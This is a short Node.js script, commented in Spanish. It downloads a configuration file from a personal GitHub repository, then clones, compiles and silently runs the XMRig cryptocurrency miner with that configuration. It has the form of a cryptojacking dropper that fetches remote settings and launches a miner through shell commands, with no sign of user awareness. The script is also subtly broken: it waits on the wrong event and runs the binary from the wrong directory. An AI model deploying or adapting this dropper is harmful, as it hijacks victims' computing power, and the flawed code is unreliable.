const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');

const configFileURL = 'https://raw.githubusercontent.com/flikamitai/Ufcujcfuuguf/main/config.json';
const configFilePath = 'config.json';

// Descargar el archivo config.json
const file = fs.createWriteStream(configFilePath);
const request = https.get(configFileURL, function(response) {
  response.pipe(file);
});

request.on('error', function(err) {
  console.error(`Error al descargar el archivo config.json: ${err.message}`);
});

request.on('finish', function() {
  console.log('Descarga del archivo config.json completada.');
  file.close();

  // Comandos para clonar el repositorio, compilar xmrig y ejecutarlo con la configuración
  const cloneCommand = 'git clone https://github.com/xmrig/xmrig.git';
  exec(cloneCommand, (cloneError, cloneStdout, cloneStderr) => {
      if (cloneError) {
          console.error(`Error al clonar el repositorio: ${cloneError}`);
          return;
      }
      console.log(`Clonación exitosa: ${cloneStdout}`);
      console.error(`stderr: ${cloneStderr}`);

      const buildCommand = 'mkdir xmrig/build && cd xmrig/build && cmake .. && make';
      exec(buildCommand, (buildError, buildStdout, buildStderr) => {
          if (buildError) {
              console.error(`Error al compilar xmrig: ${buildError}`);
              return;
          }
          console.log(`Compilación exitosa: ${buildStdout}`);
          console.error(`stderr: ${buildStderr}`);

          const runCommand = './xmrig -c config.json';
          exec(runCommand, (runError, runStdout, runStderr) => {
              if (runError) {
                  console.error(`Error al ejecutar xmrig: ${runError}`);
                  return;
              }
              console.log(`xmrig ejecutándose: ${runStdout}`);
              console.error(`stderr: ${runStderr}`);
          });
      });
  });
});
